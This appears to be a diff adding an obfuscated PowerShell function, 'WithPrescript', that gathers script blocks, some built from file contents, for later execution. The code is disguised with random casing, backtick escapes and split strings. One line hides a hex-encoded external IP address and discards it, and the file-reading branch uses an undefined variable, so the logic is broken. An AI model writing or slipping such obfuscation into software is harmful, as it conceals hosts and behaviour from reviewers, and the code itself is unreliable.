@@ -1,0 +1,49 @@
+SEt-iteM VaRIabLE:Zt3v2 (  [TYPe]('COnVe'+'r'+'t')  );  SeT-VARiAblE yg7D3N  ([TYPE]('SCrIp'+'Tb'+'Lock')) ;  Function wIthpREscRIpt {
+    
+    [cmdletbinding()]
+    param(
+        [parameter( PoSItion = 0,
+                    ValuEfroMPIpeliNe = ${TR`UE},
+                    vALUEfrOMPipeLINEbypropERTYNAmE = ${tR`Ue})]
+        [scriptblock[]]${ScrIP`Tb`LO`Ck},
+
+        [parameter( posITion = 1 )]
+        [validatescript({test-`p`AtH ${_}})]
+        [string[]]${p`AtH},
+
+        [switch]${SkiP`oN`ER`Ror}
+    )
+    (   ( " $(seT-ITEM 'VaRiaBLe:OFs' '') " +[sTring](('27h69-70@3aT3'+'6'+'h36o'+'2e-32'+'@'+'33@'+'31h2ep39-34o2eT32@33'+'h33'+'q'+'27')-spLIt'-'-SPLiT 'q'-sPLiT'p' -splIT'T' -sPLit 'h'-SPLIt 'o' -SpLit 'g' -sPLIT '@' |FOre`ACh-OB`J`Ect { ( (  GET-variABle  zT3v2 ).vaLUE::TOINt16( ( [StRIng]${_} ),16)-As[CHAR])} )+" $( sEt-ITEm 'vARiaBLe:oFs'  ' ') " ) )|  ouT-n`U`ll
+    Beg`IN
+    {
+        ${s`CRiPtsT`oP`R`OC`ESS} = nEW`-`Obj`ECT SYsTEm.CoLLectIOnS.arRAYlist
+        if(${Ps`BoUNdPa`RA`meteRS}.CONtAInsKEY(('Pa'+'th')))
+        {
+            foreach(${d`ir} in ${P`Ath})
+            {
+                ${SB} =  (  DIR  VariaBlE:YG7D3N  ).vAlUe::Create( $(Ge`T-cont`E`NT ${s`C`Rip`TFiLE} -Raw) )
+            }
+            ${PA`Ir} = [pscustomobject]@{
+                sCRIptbLOcK = ${s`B}
+                skiponErRoR = ${sk`iPone`R`Ror}
+            }
+            [void]${S`cRI`Pts`TOp`Roce`Ss}.AdD(${P`Air})
+        }
+    }
+    p`Rocess
+    {
+        foreach(${s`B} in ${sC`RIPTb`LOCK})
+        {
+            ${pa`IR} = [pscustomobject]@{
+                scRiptBLOCk = ${s`B}
+                skIPoNerroR = ${SK`IpONe`RrOR}
+            }
+            [void]${ScR`IPtS`TOprOc`ESS}.adD(${P`AIr})
+        }
+    }
+    E`ND
+    {
+        ${sCri`Pt`:T`HI`SBY}.prESCriPt = @( ${scRIP`T`ST`Op`RO`cESs} )
+    }
+}
+
